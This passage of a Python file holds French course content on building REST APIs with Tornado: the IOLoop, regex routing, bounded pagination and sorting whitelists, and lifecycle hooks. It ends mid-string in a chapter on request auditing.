"""
Manuel de Référence Approfondi — Enrichissement des Chapitres (Jours 2 et 3) — Volume III : Édition Tornado.
"""

ENRICHMENT_D2_D3 = {
    # =========================================================================
    # JOUR 2 — CHAPITRE 2.1 : SERVEUR MINIMAL TORNADO, IOLOOP & TABLE DE ROUTAGE
    # =========================================================================
    "d2-l1": {
        "context": (
            "Après avoir maîtrisé le modèle mémoire de Python (Jour 0) et la grammaire réseau HTTP/1.1 (Jour 1), nous "
            "franchissons une étape décisive en construisant notre premier démon réseau asynchrone avec **Tornado "
            "(`tornado.web.Application`, `RequestHandler`, `HTTPServer`, `IOLoop`)**. Né en 2009 chez FriendFeed (racheté "
            "par Facebook) sous la plume de Bret Taylor et Ben Darnell pour maintenir des dizaines de milliers de flux "
            "temps réel ouverts simultanément, Tornado occupe une place à part dans l'écosystème Python.\n\n"
            "Pourquoi étudier l'ingénierie des APIs à travers Tornado ? Parce qu'il combine la clarté d'une **architecture "
            "orientée objet (`RequestHandler`)** avec la puissance brute d'un **serveur HTTP non bloquant intégré** bâti "
            "pour résoudre le célèbre **problème C10K**. Ce chapitre dévoile comment un simple processus Python se "
            "métamorphose en démon événementiel piloté par `epoll`/`kqueue`, comment l'`IOLoop` orchestre les sockets sans "
            "bloquer de threads, et comment `self.write()` automatise la sérialisation JSON et le calcul d'`Etag`."
        ),
        "deep_sections": [
            {
                "heading": "1. Le Problème C10K, les Sockets Non Bloquants (`O_NONBLOCK`) et la Boucle `IOLoop` (`epoll`)",
                "body": (
                    "Dans un serveur Web synchrone traditionnel (modèle Apache `prefork` ou WSGI multi-threads), chaque "
                    "connexion cliente entrante monopolise un fil d'exécution (*thread*) dédié du système d'exploitation. "
                    "Lorsque ce thread attend qu'un client mobile sur un réseau lent transmette ses octets ou qu'une API "
                    "distante réponde, le noyau endort le thread tout en conservant sa pile d'exécution allouée en RAM "
                    "(jusqu'à 8 Mo par pile par défaut sous Linux). À dix mille connexions simultanées, la mémoire explose et "
                    "le processeur s'effondre sous le coût des changements de contexte (*context switching*).\n\n"
                    "> « Il est temps pour les serveurs Web de gérer dix mille clients simultanément, n'est-ce pas ? Après "
                    "tout, le Web est désormais un grand système distribué. » — Dan Kegel, The C10K Problem (1999)\n\n"
                    "#### Multiplexage d'événements noyau par `epoll` et `tornado.ioloop.IOLoop`\n\n"
                    "Tornado résout le problème C10K en inversant radicalement le modèle d'entrées-sorties. Lorsque vous "
                    "invoquez `app.listen(8888, address=\"0.0.0.0\")`, Tornado ouvre un descripteur de socket configuré avec "
                    "le drapeau POSIX **`O_NONBLOCK`** : toute lecture `recv()` alors qu'aucun octet n'est encore arrivé "
                    "ne bloque jamais le processus, mais retourne instantanément le code noyau `EAGAIN` / `EWOULDBLOCK`. "
                    "L'appel `tornado.ioloop.IOLoop.current().start()` (adossé depuis Tornado 5/6 à la boucle standard "
                    "`asyncio`) enregistre alors tous les descripteurs de sockets actifs auprès de l'appel système **`epoll_wait()`** "
                    "sous Linux (ou `kqueue` sous BSD/macOS, `IOCP` sous Windows). Un **unique fil d'exécution** demeure en "
                    "veille à consommation CPU nulle et n'est réveillé en temps `O(1)` que pour les sockets précis ayant "
                    "effectivement reçu des octets prêts à être décodés !"
                )
            },
            {
                "heading": "2. Modèle Orienté Objet : Instanciation Éphémère de `tornado.web.RequestHandler`",
                "body": (
                    "Contrairement aux micro-frameworks fonctionnels où chaque couple `(verbe, URL)` est rattaché à une "
                    "fonction globale isolée, Tornado regroupe toute la gestion d'une ressource REST au sein d'une **classe "
                    "héritant de `tornado.web.RequestHandler`**. La table passée à `tornado.web.Application([...])` associe "
                    "une expression régulière d'URI à cette classe contrôleur, dans laquelle chaque verbe HTTP standard "
                    "correspond directement à une méthode nommée : `def get(self):`, `def post(self):`, `def put(self):`, "
                    "`def patch(self):`, `def delete(self):` et `def options(self):`.\n\n"
                    "#### Cycle d'allocation par requête\n\n"
                    "À chaque fois que `HTTPServer` achève de lire une trame entrante sur son `IOStream`, `Application` "
                    "instancie un **nouvel objet `RequestHandler` dédié exclusivement à cette transaction** en lui injectant "
                    "`self.application` et `self.request` (`HTTPServerRequest`). Si un client tente d'envoyer un `DELETE` sur "
                    "une classe qui n'implémente que `def get(self):`, Tornado rejette automatiquement l'appel avec le statut "
                    "normatif **`405 Method Not Allowed`** sans que vous ayez une seule ligne de vérification à écrire."
                )
            },
            {
                "heading": "3. Mécanique Interne de `self.write(dict)` : Tampon `_write_buffer`, JSON et `Etag` Automatique",
                "body": (
                    "Invoquer `self.write(dictionnaire)` dans un `RequestHandler` accomplit bien davantage qu'une simple "
                    "écriture sur le réseau : Tornado inspecte d'abord `isinstance(chunk, dict)`. Dès qu'un dictionnaire est "
                    "détecté, le framework le sérialise en UTF-8 via `escape.json_encode()`, positionne automatiquement "
                    "l'en-tête **`Content-Type: application/json; charset=UTF-8`**, et accumule les octets dans une liste "
                    "interne `self._write_buffer`.\n\n"
                    "```python — Ce que self.write(dict) et self.finish() orchestrent automatiquement\n"
                    "class SanteHandler(tornado.web.RequestHandler):\n"
                    "    def get(self) -> None:\n"
                    "        # 1. Sérialise en JSON UTF-8 + pose Content-Type: application/json; charset=UTF-8\n"
                    "        self.write({\"service\": \"isgp-api\", \"statut\": \"operationnel\"})\n"
                    "        # 2. À la sortie de get(), Tornado appelle implicitement self.finish() :\n"
                    "        #    -> Calcule Content-Length + Etag SHA-1 et pousse sur l'IOStream non bloquant\n"
                    "```\n\n"
                    "> [!TIP] Validation de cache HTTP gratuite par empreinte `Etag` dans Tornado\n"
                    "> Juste avant de vider `_write_buffer` sur le socket lors de `finish()`, Tornado calcule automatiquement "
                    "sur toute réponse `GET 200` l'empreinte cryptographique **`Etag`** du corps généré ! Si le client "
                    "rappelle ultérieurement la route en joignant `If-None-Match: \"<etag>\"`, Tornado détecte la concordance "
                    "et répond **`304 Not Modified`** sans renvoyer le corps JSON sur le réseau."
                )
            }
        ],
        "architecture_diagram": (
            "CYCLE D'AIGUILLAGE D'UNE REQUÊTE DANS TORNADO (IOLOOP & APPLICATION)\n"
            "  Client HTTP (GET /api/v1/sante)\n"
            "        |\n"
            "        v\n"
            "  [Socket TCP Non-Bloquant :8888 (HTTPServer + IOLoop)]\n"
            "        |  (Lit la trame HTTP et construit HTTPServerRequest)\n"
            "        v\n"
            "  [app = tornado.web.Application([...])] ---> Parcourt les tuples Regex :\n"
            "                                                - (r'/api/v1/sante',      SanteHandler)\n"
            "                                                - (r'/api/v1/formations', FormationsHandler)\n"
            "        |\n"
            "        v\n"
            "  Instancie SanteHandler ---> appelle handler.get() ---> self.write({...}) ---> HTTP/1.1 200 OK (application/json)"
        ),
        "reference_table": {
            "title": "Composants Fondamentaux d'une Application Tornado Minimale",
            "headers": ["Élément de code", "Rôle technique exact", "Que se passe-t-il si on l'omet ?"],
            "rows": [
                ["`class MonHandler(tornado.web.RequestHandler):`", "Définit le contrôleur orienté objet d'un endpoint", "Impossible de traiter les verbes HTTP `get()` / `post()`"],
                ["`tornado.web.Application([(r\"/url\", MonHandler)])`", "Enregistre la table de routage Regex de l'application", "Aucune route n'est exposée (`404 Not Found`)"],
                ["`self.write(dictionnaire)`", "Sérialise le `dict` en JSON + ajoute `Content-Type: application/json; charset=UTF-8`", "Si on écrit une chaîne `str`, l'en-tête sera `text/html` au lieu de `application/json`"],
                ["`tornado.ioloop.IOLoop.current().start()`", "Démarre la boucle d'événements asynchrone en écoute", "Le script se termine immédiatement sans écouter les clients"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Nommer son propre fichier `tornado.py` dans le dossier de travail",
                "good": "Nommer ses fichiers `app.py`, `serveur.py` ou `01_serveur_minimal_tornado.py`",
                "why": "Si votre fichier s'appelle `tornado.py`, l'instruction `import tornado.web` importera votre propre fichier au lieu de la bibliothèque Tornado (`ModuleNotFoundError`) !"
            },
            {
                "bad": "Passer une liste brute `self.write([1, 2, 3])` directement à `self.write()`",
                "good": "Toujours passer un dictionnaire `self.write({\"data\": [1, 2, 3]})`",
                "why": "Tornado lève `TypeError: Lists not accepted for security reasons` si vous passez une `list` à `self.write()`."
            }
        ],
        "practical_exercises": [
            "Exécutez `day_2/01_serveur_minimal_tornado.py` dans l'atelier ci-dessus pour inspecter la table de routage compilée par `tornado.web.Application` et vérifier les en-têtes émis.",
            "Ajoutez une classe `VersionHandler(tornado.web.RequestHandler)` rattachée au motif `r\"/api/v1/version\"` renvoyant `{\"framework\": \"Tornado\", \"modele\": \"IOLoop non-bloquant\"}` et vérifiez son `Content-Type` avec `AsyncHTTPClient`."
        ]
    },

    # =========================================================================
    # JOUR 2 — CHAPITRE 2.2 : MATURITÉ REST (RICHARDSON), ROUTAGE REGEX & ARGUMENTS D'URL
    # =========================================================================
    "d2-l2": {
        "context": (
            "Exposer une route `/api/traiterDemande` renvoyant du JSON ne suffit nullement à qualifier une architecture "
            "de **RESTful**. Comment les équipes d'ingénierie de Stripe, GitHub, Cloudflare ou Google Cloud conçoivent-elles "
            "leurs espaces d'adressage pour qu'un intégrateur externe devine intuitivement le comportement de cent routes "
            "en quelques minutes ?\n\n"
            "Dans Tornado, cette rigueur de conception s'appuie directement sur le routeur d'**expressions régulières "
            "(`tornado.routing` / `URLSpec`)** et sur les accesseurs typés de `RequestHandler`. Ce chapitre relie le "
            "**Modèle de Maturité de Richardson** aux mécanismes internes de capture de groupes Regex `([0-9]+)` et de "
            "décodage défensif via `self.get_query_argument()`."
        ),
        "deep_sections": [
            {
                "heading": "1. Le Modèle de Maturité de Leonard Richardson (Niveaux 0 à 3) Appliqué à Tornado",
                "body": (
                    "Proposé en 2008 par Leonard Richardson, ce référentiel évalue le degré d'exploitation sémantique du "
                    "protocole HTTP par une API sur quatre paliers progressifs. Au **Niveau 0 (*The Swamp of POX*)**, "
                    "l'application détourne HTTP en simple tunnel RPC : une unique URL `POST /api/service` reçoit des "
                    "commandes hétérogènes telles que `{\"action\": \"listerFormations\"}` ou `{\"action\": \"supprimerFormation\"}` "
                    "en répondant invariablement `200 OK`, rendant tout cache HTTP ou routage proxy aveugle. Le **Niveau 1** "
                    "découpe le domaine en **ressources nominales au pluriel** dotées chacune de son URI propre "
                    "(`/api/v1/formations`, `/api/v1/formations/42`), mais continue d'abuser de `GET` ou `POST` pour toutes "
                    "les mutations.\n\n"
                    "#### Le Niveau 2 industriel et l'horizon hypermédia HATEOAS (Niveau 3)\n\n"
                    "Le **Niveau 2** constitue l'étalon-or des APIs REST d'entreprise et épouse exactement la conception de "
                    "`tornado.web.RequestHandler` : les URIs ne contiennent **jamais de verbes d'action**, uniquement des "
                    "noms de collections et d'identifiants, tandis que la méthode Python invoquée (`get`, `post`, `put`, "
                    "`patch`, `delete`) exprime l'opération et que `self.set_status()` restitue l'issue précise (`200`, `201`, "
                    "`204`, `404`, `409`, `422`). Enfin, le **Niveau 3 (*HATEOAS — Hypermedia As The Engine Of Application "
                    "State*)** enrichit chaque réponse JSON d'un dictionnaire `\"links\"` guidant dynamiquement le client "
                    "vers les transitions permises (`\"self\"`, `\"next\"`, `\"inscription\"`)."
                )
            },
            {
                "heading": "2. Mécanique Interne d'`URLSpec` : Groupes Regex Positionnels vs Nommés et `Path` vs `Query`",
                "body": (
                    "Lorsque vous enregistrez un tuple `(r\"/api/formations/([0-9]+)\", FormationHandler)` dans "
                    "`tornado.web.Application`, Tornado l'encapsule dans un objet `tornado.web.URLSpec` qui compile le motif "
                    "avec `re.compile()` (en ancrant automatiquement la fin par `$` s'il n'est pas déjà présent). Si le motif "
                    "utilise des **groupes anonymes `([0-9]+)`**, les sous-chaînes capturées sont transmises dans `self.path_args` "
                    "et passées en arguments positionnels à `def get(self, formation_id: str):`. Si vous utilisez des **groupes "
                    "nommés Python `(?P<formation_id>[0-9]+)`**, Tornado remplit `self.path_kwargs` et appelle la méthode par "
                    "mot-clé `def get(self, formation_id: str):`, ce qui sécurise l'ordre des paramètres sur les routes "
                    "imbriquées complexes.\n\n"
                    "```python — Groupes nommés (?P<...>) sur une sous-ressource REST hiérarchique\n"
                    "app = tornado.web.Application([\n"
                    "    (r\"/api/v1/formations/(?P<formation_id>[0-9]+)/inscrits/(?P<stagiaire_id>[0-9]+)\",\n"
                    "     InscriptionDetailHandler),\n"
                    "])\n"
                    "```\n\n"
                    "> [!IMPORTANT] Critère architectural : Path Parameter (`404`) contre Query Parameter (`200 + []`)\n"
                    "> Un **paramètre de chemin** (`/formations/42`) désigne l'identité unique d'une ressource : si l'entité "
                    "`#42` est absente de la base, le handler doit impérativement répondre **`404 Not Found`**. À l'inverse, "
                    "un **paramètre de requête** (`?salle=Tamanrasset&duree_min=3`) filtre ou pagine une collection existante : "
                    "si aucun enregistrement ne satisfait le filtre, la ressource collection `/formations` existe toujours et "
                    "doit répondre **`200 OK` avec une liste vide `{\"total\": 0, \"data\": []}`** !"
                )
            },
            {
                "heading": "3. Décodage Défensif de `self.get_query_argument` et Concordance des 4 Notations d'URI",
                "body": (
                    "Dans un `RequestHandler`, la méthode `self.get_query_argument(name, default=_ARG_DEFAULT, strip=True)` "
                    "opère trois traitements précieux : elle extrait la dernière valeur associée à `name` dans l'URL, la "
                    "décode en UTF-8 et élague par défaut les espaces parasites en début et fin de chaîne (`strip=True`). "
                    "Comprendre son second paramètre évite de nombreux bugs : appelée **sans valeur par défaut** "
                    "(`self.get_query_argument(\"ht\")`), elle lève automatiquement `tornado.web.MissingArgumentError`, une "
                    "sous-classe de `HTTPError(400)` qui renvoie aussitôt `400 Bad Request` au client si `?ht=` manque. "
                    "Appelée avec une valeur de repli (`self.get_query_argument(\"taux\", \"19.0\")`), elle garantit le "
                    "retour d'une chaîne qu'il convient de convertir dans un bloc `try: float(...) except ValueError:`.\n\n"
                    "#### Pourquoi coexistent `([0-9]+)`, `<int:id>`, `:id` et `{id}` dans votre boîte à outils ?\n\n"
                    "En ingénierie quotidienne, la même variable de chemin s'écrit sous quatre conventions distinctes qu'il "
                    "ne faut jamais mélanger d'un fichier à l'autre : Tornado compile des expressions régulières natives "
                    "`([0-9]+)` dans le code Python serveur ; Flask/Werkzeug utilise des convertisseurs entre chevrons `<int:id>` ; "
                    "**Postman** (ainsi qu'Express.js) reconnaît le préfixe deux-points `:id` pour peupler son tableau "
                    "graphique *Path Variables* ; enfin, la norme **OpenAPI 3.0 / IETF RFC 6570 (*URI Template*)** impose les "
                    "accolades `{id}` dans `/api/openapi.json` et Swagger UI."
                )
            }
        ],
        "architecture_diagram": (
            "1. COMPARAISON ARCHITECTURALE : ANTI-PATTERN RPC vs STANDARD REST (NIVEAU 2)\n"
            "  [ANTI-PATTERN RPC]                       [STANDARD RESTFUL (Noms au pluriel + Verbes HTTP)]\n"
            "  GET  /api/getAllFormations       ===>    GET    /api/v1/formations\n"
            "  GET  /api/getFormationById?id=5  ===>    GET    /api/v1/formations/5\n"
            "  POST /api/createNewFormation     ===>    POST   /api/v1/formations\n"
            "  POST /api/updateFormation/5      ===>    PUT    /api/v1/formations/5\n"
            "  GET  /api/deleteFormation?id=5   ===>    DELETE /api/v1/formations/5\n\n"
            "2. TRADUCTION D'UNE VARIABLE DE CHEMIN SELON L'OUTIL :\n"
            "  - Dans le code serveur Tornado : (r\"/api/v1/formations/([0-9]+)\", Handler)   <-- Groupe Regex ([0-9]+)\n"
            "  - Dans l'interface Postman     : GET http://.../api/v1/formations/:id        <-- Deux-points :id\n"
            "  - Dans OpenAPI / Swagger       : GET /api/v1/formations/{id}                 <-- Accolades {...}\n"
            "  - Dans curl / Navigateur       : curl http://.../api/v1/formations/42        <-- Valeur réelle 42"
        ),
        "reference_table": {
            "title": "Synthèse : Lecture dans `RequestHandler` & Notations des Variables d'URL",
            "headers": ["Élément / Syntaxe", "Où est-il utilisé ?", "Exemple concret", "Comportement & Règle d'or"],
            "rows": [
                ["`([0-9]+)` / `(?P<id>[0-9]+)`", "**Tornado (`tornado.web.Application`)**", "`(r'/api/formations/([0-9]+)', Handler)`", "Valide le format par Regex et passe la chaîne capturée à `def get(self, id):`"],
                ["`:variable` (ex. `:id`)", "**Postman**, Express.js (Node), Rails", "`/api/formations/:id`", "Crée une variable de chemin dans Postman, mais **n'est pas reconnu par Tornado** !"],
                ["`{variable}` (ex. `{id}`)", "**OpenAPI 3.0 (Swagger)**, FastAPI", "`/api/formations/{id}`", "Standard officiel de documentation d'API (RFC 6570)"],
                ["`self.get_query_argument`", "Query String (après `?`)", "`GET /api/formations?salle=Alger&page=2`", "`int(self.get_query_argument(\"page\", \"1\"))`"],
                ["`self.request.headers`", "En-têtes HTTP (`Headers`)", "`X-API-Key: secret`", "`self.request.headers.get(\"X-API-Key\", \"\")`"],
                ["`tornado.escape.json_decode`", "Corps (`self.request.body`)", "`{\"titre\": \"Tornado\", \"jours\": 5}`", "`corps = tornado.escape.json_decode(self.request.body)`"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Écrire `(r'/api/formations/:id', Handler)` ou `<int:id>` dans une route Tornado",
                "good": "Toujours utiliser une expression régulière `(r'/api/formations/([0-9]+)', Handler)` dans Tornado",
                "why": "Le routeur Tornado est basé sur `re.compile()` : seuls les groupes entre parenthèses `(...)` extraient les paramètres d'URL."
            },
            {
                "bad": "Mettre des verbes d'action dans les URLs : `/api/creer_formation`, `/api/listerFormations`",
                "good": "Utiliser uniquement des noms de ressources au pluriel (`/api/formations`) et laisser `def post` / `def get` définir l'action",
                "why": "Respecter le Niveau 2 de Richardson évite la prolifération de centaines d'URLs incohérentes."
            },
            {
                "bad": "Renvoyer `404 Not Found` lorsqu'une recherche filtrée `GET /api/formations?salle=Tamanrasset` ne trouve aucun résultat",
                "good": "Renvoyer `200 OK` avec `{\"total\": 0, \"formations\": []}`",
                "why": "`404` sur une collection ferait croire au client que la route `/api/formations` n'existe plus."
            }
        ],
        "practical_exercises": [
            "Dans l'exécuteur ci-dessus, analysez les requêtes simulées vers `/api/v1/stagiaires/2` et `/api/v1/calcul-tva?ht=2500&taux=19`, puis testez le comportement de `StagiaireJsonHandler` face à `/api/v1/stagiaires/abc`.",
            "Interrogez l'endpoint réel `GET /api/sandbox/calcul-tva?ht=2500&taux=19` depuis le Client HTTP ou via `curl` en encadrant l'URL de guillemets."
        ]
    },

    # =========================================================================
    # JOUR 2 — CHAPITRE 2.3 : PAGINATION (OFFSET/LIMIT), FILTRAGE & TRI
    # =========================================================================
    "d2-l3": {
        "context": (
            "Sur un poste de développement contenant quatre formations de démonstration, exécuter `SELECT * FROM formations` "
            "et sérialiser toute la liste via `self.write()` s'achève en moins d'une milliseconde. Mais projetons ce "
            "même code six mois après la mise en production, lorsque la table des écritures comptables ou des inscriptions "
            "totalise **deux millions de lignes**.\n\n"
            "Dans un serveur événementiel Tornado, une route de collection dépourvue de pagination déclenche une double "
            "catastrophe : elle sature la mémoire vive du processus jusqu'au tueur noyau *OOM Killer*, et confisque "
            "surtout le fil unique de l'`IOLoop` pendant plusieurs secondes d'encodage JSON synchrone, paralysant "
            "instantanément toutes les autres connexions actives. **La Pagination bornée, le Filtrage amont et le Tri "
            "validé par liste blanche** constituent donc une exigence d'architecture non négociable."
        ),
        "deep_sections": [
            {
                "heading": "1. Algèbre de la Pagination `Offset / Limit` et Métadonnées de Navigation",
                "body": (
                    "Le patron de pagination par pages numérotées repose sur le couple de paramètres de requête `page` "
                    "(indice humain commençant à `1`) et `limit` (cardinalité maximale d'une tranche, typiquement `10` ou `20`). "
                    "La projection de ces coordonnées vers un indice de tableau zéro-basé en mémoire Python ou vers une clause "
                    "SQL `LIMIT ? OFFSET ?` obéit à l'identité arithmétique fondamentale **`offset = (page - 1) * limit`** : "
                    "la page `1` saute `0` élément (`[0:10]`), la page `2` saute les `10` premiers (`[10:20]`), et la page `k` "
                    "démarre exactement à `(k - 1) * limit`.\n\n"
                    "#### Calcul exact du plafond de pages sans flottants\n\n"
                    "Pour renseigner l'objet `meta` permettant aux frontaux Web et mobiles de dessiner leurs contrôles de "
                    "navigation, le nombre total de pages se calcule par division entière par excès sur le total filtré "
                    "`total_items` : **`total_pages = max(1, (total_items + limit - 1) // limit)`** (équivalent exact en "
                    "arithmétique entière pure de `math.ceil(total_items / limit)` lorsque `total_items > 0`, tout en "
                    "garantissant `1` page minimale lorsque la recherche renvoie `0` résultat). Les drapeaux booléens "
                    "`has_next = page < total_pages` et `has_prev = page > 1` dispensent le client de tout recalcul sujet aux "
                    "erreurs d'arrondi."
                )
            },
            {
                "heading": "2. Plafonnement Défensif Anti-DoS (`min` / `max`) pour Protéger la Latence de l'`IOLoop`",
                "body": (
                    "Extraire naïvement `limit = int(self.get_query_argument('limit', '10'))` sans borner l'entier obtenu "
                    "laisse grande ouverte une vulnérabilité de **Déni de Service Applicatif (*Resource Exhaustion DoS*)** : "
                    "il suffit à un attaquant d'appeler `GET /api/v1/formations?page=-5&limit=999999999` pour provoquer soit "
                    "un indiçage négatif incohérent en Python (`liste[-50:]`), soit l'extraction intégrale de la base SQL "
                    "contournant toute votre pagination !\n\n"
                    "```python — Extraction et bornage défensif strict des coordonnées de pagination\n"
                    "try:\n"
                    "    page = max(1, int(self.get_query_argument(\"page\", \"1\")))\n"
                    "    limit = min(50, max(1, int(self.get_query_argument(\"limit\", \"10\"))))\n"
                    "except ValueError:\n"
                    "    self.set_status(400)\n"
                    "    self.finish({\"erreur\": \"Les paramètres 'page' et 'limit' doivent être des entiers.\"})\n"
                    "    return\n"
                    "```\n\n"
                    "> [!IMPORTANT] Ordre impératif du pipeline de collection : Filtrer -> Compter -> Trier -> Découper\n"
                    "> La cardinalité `total_items` doit toujours être mesurée **après le filtrage métier** (`?salle=Alger`) "
                    "mais **avant le découpage de la tranche `[offset : offset + limit]`**. Calculer `len(tranche)` après "
                    "découpage renverrait systématiquement `2` au lieu du nombre réel d'enregistrements correspondant à la "
                    "recherche."
                )
            },
            {
                "heading": "3. Validation par Liste Blanche (*Whitelist*) des Clés de Tri Dynamique",
                "body": (
                    "Offrir un tri paramétrable tel que `?tri=duree_jours&ordre=desc` exige une barrière de validation "
                    "explicite sur le nom de l'attribut demandé. En mémoire Python, passer une clé arbitraire choisie par "
                    "l'appelant à `sorted(resultats, key=lambda x: x[champ_tri])` déclenche une `KeyError` (`HTTP 500`) ou "
                    "permet de sonder des champs internes non exposés ; en SQL, interpoler ce paramètre dans une clause "
                    "`ORDER BY` ouvre une faille critique d'**Injection SQL**.\n\n"
                    "Le standard industriel définit une constante immuable `CHAMPS_TRI_AUTORISES = (\"id\", \"duree_jours\", \"titre\")` "
                    "ainsi que l'ensemble `ORDRES_AUTORISES = (\"asc\", \"desc\")`. Toute valeur absente de cette liste "
                    "blanche est immédiatement rejetée par `self.set_status(400)` en énumérant explicitement les colonnes "
                    "admises au contrat."
                )
            }
        ],
        "architecture_diagram": (
            "PIPELINE DE TRAITEMENT D'UNE COLLECTION REST (GET /api/formations?salle=Alger&tri=duree_jours&ordre=desc&page=2&limit=2)\n\n"
            "  [Collection Complète (N éléments)] \n"
            "          |\n"
            "          v  1. FILTRAGE (?salle=Alger)\n"
            "  [Sous-ensemble filtré (total_items = 5)]\n"
            "          |\n"
            "          v  2. TRI SÉCURISÉ (?tri=duree_jours&ordre=desc via Whitelist)\n"
            "  [Sous-ensemble filtré et trié (5 éléments)]\n"
            "          |\n"
            "          v  3. DÉCOUPAGE PAGINATION (offset = (2-1)*2 = 2, tranche [2 : 4])\n"
            "  [Réponse JSON : {\"meta\": {\"total_items\": 5, \"page\": 2, \"total_pages\": 3, \"has_next\": true}, \"data\": [elem2, elem3]}]"
        ),
        "reference_table": {
            "title": "Structure Standard de l'Objet `meta` de Pagination dans une Réponse JSON Tornado",
            "headers": ["Clé JSON dans `meta`", "Type", "Formule de calcul en Python", "Utilité pour l'interface cliente (Web / Mobile)"],
            "rows": [
                ["`total_items`", "`int`", "`len(resultats_filtres)` ou `SELECT COUNT(*)`", "Afficher « 48 formations trouvées »"],
                ["`page`", "`int`", "`max(1, int(self.get_query_argument('page', '1')))`", "Mettre en surbrillance le numéro de page courant"],
                ["`limit`", "`int`", "`min(50, max(1, int(self.get_query_argument('limit', '10'))))`", "Connaître la taille de tranche appliquée"],
                ["`total_pages`", "`int`", "`max(1, (total_items + limit - 1) // limit)`", "Générer les boutons de pagination « Page 1 sur 5 »"],
                ["`has_next`", "`bool`", "`page < total_pages`", "Activer ou griser le bouton « Page suivante »"],
                ["`has_prev`", "`bool`", "`page > 1`", "Activer ou griser le bouton « Page précédente »"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Calculer `total_items` APRES avoir découpé la tranche `tranche = resultats[offset:offset+limit]`",
                "good": "Calculer `total_items = len(resultats)` sur les résultats filtrés AVANT le découpage de la page",
                "why": "Sinon `total_items` vaudra toujours `limit` (ex: 2) au lieu du nombre total réel d'enregistrements correspondant à la recherche !"
            },
            {
                "bad": "Trier AVANT de filtrer sur de grands volumes de données",
                "good": "Toujours **Filtrer d'abord**, puis **Trier**, puis **Paginer**",
                "why": "Trier 100 000 lignes pour n'en garder que 10 après filtrage gaspille 99 % du temps processeur."
            }
        ],
        "practical_exercises": [
            "Dans l'exécuteur Python ci-dessus, interrogez successivement `page=2` puis `page=3` avec `limit=2` et vérifiez la bascule exacte des booléens `a_page_suivante`.",
            "Actionnez le bouton « Tester la Pagination & le Tri » pour exécuter `GET /api/sandbox/formations?page=1&limit=2&tri=duree_jours&ordre=desc` contre le serveur Tornado actif."
        ]
    },

    # =========================================================================
    # JOUR 2 — CHAPITRE 2.4 : HOOKS DE CYCLE DE VIE (PREPARE / ON_FINISH)
    # =========================================================================
    "d2-l4": {
        "context": (
            "Lorsqu'une plateforme Tornado fédère cinquante classes `RequestHandler`, comment chronométrer à la "
            "microseconde près chaque appel entrant, propager un identifiant de corrélation distribué (`X-Request-ID`), "
            "injecter les en-têtes de durcissement sécurité et consigner un journal d'audit réglementaire sans dupliquer "
            "une seule ligne de code dans les cinquante contrôleurs ?\n\n"
            "Là où les frameworks WSGI/ASGI empilent des couches externes de fonctions *middlewares*, Tornado résout "
            "cette problématique avec une pureté orientée objet remarquable : une classe socle **`BaseHandler(tornado.web.RequestHandler)`** "
            "redéfinit les crochets internes du pipeline `RequestHandler._execute()` : **`set_default_headers()`**, "
            "**`prepare()`** et **`on_finish()`**."
        ),
        "deep_sections": [
            {
                "heading": "1. Radiographie Interne de `RequestHandler._execute()` : Les Quatre Phases d'une Requête",
                "body": (
                    "Comprendre dans quel ordre exact Tornado orchestre une instance de `RequestHandler` permet de placer "
                    "chaque responsabilité transversale à l'endroit architecturalement juste. Dès l'`__init__()` du handler, "
                    "Tornado appelle immédiatement **`set_default_headers(self)`** (et la rappellera automatiquement si "
                    "`self.clear()` est invoqué lors d'un passage dans `write_error()`) : c'est donc l'unique emplacement "
                    "fiable pour poser les en-têtes permanents (`X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, "
                    "en-têtes CORS) afin qu'ils survivent même en cas d'erreur `404` ou `500`.\n\n"
                    "#### Le crochet `prepare(self)` (synchrone ou `async def`) et le court-circuit `self.finish()`\n\n"
                    "Ensuite, la coroutine interne `_execute()` invoque **`prepare(self)`** (qui peut être déclarée `async def prepare(self):` "
                    "pour interroger Redis ou une base asynchrone) juste avant d'appeler la méthode HTTP (`get`, `post`, `put`, "
                    "`delete`). Détail mécanique décisif : dès le retour de `prepare()`, Tornado vérifie le drapeau interne "
                    "`if not self._finished:` ! Par conséquent, si `prepare()` détecte un dépassement de quota ou un jeton "
                    "invalide et appelle **`self.finish({...})`**, Tornado saute intégralement l'appel à `get()`/`post()` "
                    "et passe directement au nettoyage final. Enfin, une fois les octets intégralement remis au tampon "
                    "`IOStream`, Tornado exécute **`on_finish(self)`** pour émettre la trace d'audit et fermer les ressources.\n\n"
                    "```python — Architecture canonique d'un BaseAuditHandler industriel dans Tornado\n"
                    "class BaseAuditHandler(tornado.web.RequestHandler):\n"
                    "    def set_default_headers(self) -> None:\n"
                    "        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n\n"
                    "    async def prepare(self) -> None:\n"
                    "        self.t0 = time.perf_counter()\n"
                    "        self.request_id = self.request.headers.get(\"X-Request-ID\") or f\"req-{uuid.uuid4().hex[:12]}\"\n"
                    "        self.set_header(\"X-Request-ID\", self.request_id)\n\n"
                    "    def on_finish(self) -> None:\n"
                    "        duree_ms = (time.perf_counter() - self.t0) * 1000.0\n"
                    "        print(f\"[AUDIT] id={self.request_id} status={self.get_status()} ms={duree_ms:.2f}\")\n"
                    "```"
                )
            },
            {
                "heading": "2. Isolation Mémoire sur `self` face aux Conditions de Course (*Race Conditions*) sur l'`IOLoop`",
                "body": (
                    "Sur une boucle d'événements `IOLoop`, deux requêtes asynchrones `A` et `B` entrelacent leur exécution à "
                    "chaque point de suspension `await`. Si un développeur stockait `HEURE_DEBUT` ou `UTILISATEUR_COURANT` "
                    "dans une variable globale du module Python, la requête `B` écraserait la valeur de la requête `A` pendant "
                    "que `A` attend la réponse d'une requête réseau, provoquant une fuite catastrophique d'identité ou de "
                    "métriques entre deux clients distincts !\n\n"
                    "> [!IMPORTANT] Garantie d'isolation par instance de `RequestHandler`\n"
                    "> Parce que `tornado.web.Application` alloue un **objet `RequestHandler` neuf par transaction HTTP**, "
                    "l'espace d'attributs `self.__dict__` (`self.t0`, `self.request_id`, `self.current_user`) appartient "
                    "exclusivement à cette requête unique du début de `prepare()` jusqu'à la sortie de `on_finish()`, "
                    "sans nécessiter de `contextvars` complexes ni de verrous `threading.Lock`."
                )
            },
            {
                "heading": "3. Horloge Monotone (`time.perf_counter`) et Traçabilité par `X-Request-ID`",
                "body": (
                    "Deux bonnes pratiques d'observabilité séparent un serveur amateur d'une infrastructure de production. "
